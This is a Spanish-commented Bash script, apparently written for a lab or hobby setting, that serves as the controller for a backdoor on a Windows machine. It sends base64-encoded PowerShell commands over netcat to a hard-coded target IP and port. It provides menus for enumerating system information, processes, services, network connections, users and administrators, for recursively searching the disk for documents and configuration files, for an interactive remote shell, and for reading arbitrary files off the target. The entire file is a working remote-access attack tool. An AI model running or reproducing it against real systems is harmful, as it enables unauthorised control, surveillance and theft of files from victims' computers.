#!/bin/bash


# Configuración
TARGET_IP="192.168.203.189"  # Cambiar por IP del Windows
LOCAL_IP=$(hostname -I | awk '{print $1}')
PORT=4445

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Función para ejecutar comandos en Windows
execute_powershell() {
    local command="$1"
    local encoded_cmd=$(echo -n "$command" | base64 -w 0)
    
    echo -e "${YELLOW}[Ejecutando]${NC} $command"
    echo "powershell -EncodedCommand $encoded_cmd" | nc -w 5 $TARGET_IP $PORT
    echo ""
}

# Función para mostrar información del sistema Windows
get_windows_info() {
    echo -e "${CYAN}[+] Obteniendo información del sistema Windows...${NC}"
    
    local info_command='systeminfo | Select-Object -First 30 | Out-String'
    execute_powershell "$info_command"
}

# Función para obtener procesos de Windows
get_windows_processes() {
    echo -e "${CYAN}[+] Obteniendo lista de procesos...${NC}"
    
    local process_command='Get-Process | Select-Object Name, CPU, WorkingSet, Id, Path | Sort-Object CPU -Descending | Select-Object -First 20 | Format-Table -AutoSize | Out-String -Width 500'
    execute_powershell "$process_command"
}

# Función para explorar archivos del sistema
explore_system_files() {
    echo -e "${CYAN}[+] Explorando sistema de archivos...${NC}"
    echo -e "${BLUE}Selecciona ubicación:${NC}"
    echo "1. Unidad C:\\ (Raíz)"
    echo "2. Directorio Usuarios"
    echo "3. Windows y System32"
    echo "4. Archivos de Programa"
    echo "5. Directorio Personalizado"
    echo "6. Buscar archivos específicos"
    
    read -p "Opción [1-6]: " location_choice
    
    case $location_choice in
        1)
            local file_command='Get-ChildItem C:\ -ErrorAction SilentlyContinue | Select-Object Name, LastWriteTime, Length, Attributes | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$file_command"
            ;;
        2)
            local file_command='Get-ChildItem C:\Users -ErrorAction SilentlyContinue | Select-Object Name, LastWriteTime, Length | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$file_command"
            ;;
        3)
            local file_command='Get-ChildItem C:\Windows\System32 -ErrorAction SilentlyContinue | Select-Object Name, LastWriteTime, Length | Select-Object -First 30 | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$file_command"
            ;;
        4)
            local file_command='Get-ChildItem "C:\Program Files","C:\Program Files (x86)" -ErrorAction SilentlyContinue | Select-Object Name, LastWriteTime | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$file_command"
            ;;
        5)
            read -p "Introduce ruta (ej: C:\Windows\Temp): " custom_path
            local file_command="Get-ChildItem '$custom_path' -ErrorAction SilentlyContinue | Select-Object Name, LastWriteTime, Length | Format-Table -AutoSize | Out-String -Width 500"
            execute_powershell "$file_command"
            ;;
        6)
            echo -e "${PURPLE}Buscar archivos por extensión:${NC}"
            echo "1. Documentos (.pdf, .doc, .docx, .xlsx)"
            echo "2. Ejecutables (.exe, .msi, .bat)"
            echo "3. Configuración (.config, .ini, .xml)"
            echo "4. Logs (.log, .txt)"
            echo "5. Personalizado"
            
            read -p "Opción [1-5]: " search_choice
            
            case $search_choice in
                1)
                    local search_command='Get-ChildItem C:\ -Recurse -Include *.pdf,*.doc,*.docx,*.xlsx,*.ppt -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime | Select-Object -First 20 | Format-Table -AutoSize | Out-String -Width 500'
                    execute_powershell "$search_command"
                    ;;
                2)
                    local search_command='Get-ChildItem C:\ -Recurse -Include *.exe,*.msi,*.bat,*.ps1 -ErrorAction SilentlyContinue | Select-Object FullName, VersionInfo, LastWriteTime | Select-Object -First 20 | Format-Table -AutoSize | Out-String -Width 500'
                    execute_powershell "$search_command"
                    ;;
                3)
                    local search_command='Get-ChildItem C:\ -Recurse -Include *.config,*.ini,*.xml,*.json -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime | Select-Object -First 20 | Format-Table -AutoSize | Out-String -Width 500'
                    execute_powershell "$search_command"
                    ;;
                4)
                    local search_command='Get-ChildItem C:\ -Recurse -Include *.log,*.txt -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime | Select-Object -First 20 | Format-Table -AutoSize | Out-String -Width 500'
                    execute_powershell "$search_command"
                    ;;
                5)
                    read -p "Introduce extensiones (ej: *.txt,*.pdf): " extensions
                    local search_command="Get-ChildItem C:\ -Recurse -Include $extensions -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime | Select-Object -First 20 | Format-Table -AutoSize | Out-String -Width 500"
                    execute_powershell "$search_command"
                    ;;
                *)
                    echo -e "${RED}Opción inválida${NC}"
                    ;;
            esac
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            ;;
    esac
}

# Función para obtener información de servicios CORREGIDA
get_services_info() {
    echo -e "${CYAN}[+] Obteniendo información de servicios...${NC}"
    echo -e "${BLUE}Selecciona tipo de servicios:${NC}"
    echo "1. Todos los servicios"
    echo "2. Servicios en ejecución"
    echo "3. Servicios detenidos"
    echo "4. Servicios automáticos"
    echo "5. Servicios vulnerables"
    
    read -p "Opción [1-5]: " service_choice
    
    case $service_choice in
        1)
            local service_command='Get-Service | Select-Object Name, Status, DisplayName | Sort-Object Status | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$service_command"
            ;;
        2)
            local service_command='Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, StartType | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$service_command"
            ;;
        3)
            local service_command='Get-Service | Where-Object {$_.Status -eq "Stopped"} | Select-Object Name, DisplayName | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$service_command"
            ;;
        4)
            local service_command='Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq "Auto"} | Select-Object Name, DisplayName, State | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$service_command"
            ;;
        5)
            local service_command='Get-Service | Where-Object {$_.Name -like "*sql*" -or $_.Name -like "*ftp*" -or $_.Name -like "*telnet*" -or $_.Name -like "*remote*"} | Select-Object Name, Status, DisplayName | Format-Table -AutoSize | Out-String -Width 500'
            execute_powershell "$service_command"
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            ;;
    esac
}

# Función para reverse shell interactiva
start_interactive_shell() {
    echo -e "${CYAN}[+] Iniciando sesión interactiva...${NC}"
    echo -e "${YELLOW}Escribe 'exit' para volver al menú${NC}"
    echo ""
    
    while true; do
        read -p "PS > " cmd
        if [[ "$cmd" == "exit" ]]; then
            break
        fi
        if [[ ! -z "$cmd" ]]; then
            execute_powershell "$cmd"
        fi
    done
}

# Función para obtener información de red
get_network_info() {
    echo -e "${CYAN}[+] Obteniendo información de red...${NC}"
    
    local net_command='ipconfig /all | Select-String -Pattern "IPv4|Subred|Puerta|Adaptador" | Out-String'
    execute_powershell "$net_command"
    
    # Conexiones de red
    echo -e "${CYAN}[+] Conexiones de red activas:${NC}"
    local conn_command='netstat -ano | Select-String -Pattern "ESTABLISHED|LISTENING" | Select-Object -First 20 | Out-String'
    execute_powershell "$conn_command"
}

# Función para usuarios y grupos
get_users_groups() {
    echo -e "${CYAN}[+] Obteniendo información de usuarios y grupos...${NC}"
    
    local user_command='net user | Out-String'
    execute_powershell "$user_command"
    
    local admin_command='net localgroup administrators | Out-String'
    execute_powershell "$admin_command"
}

# Función para información del disco
get_disk_info() {
    echo -e "${CYAN}[+] Información de discos...${NC}"
    
    local disk_command='Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace | ForEach-Object { $_.DeviceID + " Tamaño: " + [math]::Round($_.Size/1GB,2) + "GB Libre: " + [math]::Round($_.FreeSpace/1GB,2) + "GB" } | Out-String'
    execute_powershell "$disk_command"
}

# Función para descargar archivos
download_file() {
    read -p "Ruta del archivo a descargar: " file_path
    echo -e "${CYAN}[+] Preparando descarga de $file_path ...${NC}"
    
    local download_command="if (Test-Path '$file_path') { Get-Content '$file_path' -Raw } else { 'Archivo no encontrado' }"
    execute_powershell "$download_command"
}

# Menú principal mejorado
show_menu() {
    clear
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════╗"
    echo "║         MENU & REVERSESHELL              ║"
    echo "║               By Ramon                   ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}1.${NC}  Información del Sistema"
    echo -e "${YELLOW}2.${NC}  Procesos Activos"
    echo -e "${YELLOW}3.${NC}  Explorar Sistema Archivos"
    echo -e "${YELLOW}4.${NC}  Servicios del Sistema"
    echo -e "${YELLOW}5.${NC}  Información de Red"
    echo -e "${YELLOW}6.${NC}  Usuarios y Grupos"
    echo -e "${YELLOW}7.${NC}  Información de Discos"
    echo -e "${YELLOW}8.${NC}  Shell Interactiva"
    echo -e "${YELLOW}9.${NC}  Descargar Archivo"
    echo -e "${YELLOW}10.${NC} Salir"
    echo ""
    echo -e "${BLUE}Target:${NC} $TARGET_IP:$PORT"
    echo -e "${BLUE}Local:${NC} $LOCAL_IP"
    echo ""
}

# Verificar conexión al inicio
check_connection() {
    echo -e "${CYAN}[+] Verificando conexión con Windows...${NC}"
    if nc -z -w 2 $TARGET_IP $PORT 2>/dev/null; then
        echo -e "${GREEN}[+] Conexión exitosa con $TARGET_IP:$PORT${NC}"
        return 0
    else
        echo -e "${RED}[-] No se puede conectar a $TARGET_IP:$PORT${NC}"
        echo -e "${YELLOW}[!] Verifica que el backdoor esté ejecutándose en Windows${NC}"
        return 1
    fi
}

# Limpiar al salir
cleanup() {
    echo -e "${RED}[+] Cerrando herramienta...${NC}"
    exit 0
}

trap cleanup EXIT INT TERM

# Main
main() {
    echo -e "${GREEN}[+] Iniciando herramienta de control remoto...${NC}"
    
    if ! check_connection; then
        echo -e "${RED}[-] No se puede establecer conexión. Saliendo...${NC}"
        exit 1
    fi
    
    sleep 2
    
    while true; do
        show_menu
        read -p "Selecciona una opción [1-10]: " choice
        
        case $choice in
            1) get_windows_info ;;
            2) get_windows_processes ;;
            3) explore_system_files ;;
            4) get_services_info ;;
            5) get_network_info ;;
            6) get_users_groups ;;
            7) get_disk_info ;;
            8) start_interactive_shell ;;
            9) download_file ;;
            10) 
                echo -e "${GREEN}[+] Saliendo...${NC}"
                cleanup 
                ;;
            *)
                echo -e "${RED}[-] Opción inválida${NC}"
                sleep 1
                ;;
        esac
        
        if [[ $choice -ne 8 ]] && [[ $choice -ne 10 ]]; then
            echo ""
            read -p "Presiona Enter para continuar..."
        fi
    done
}

main
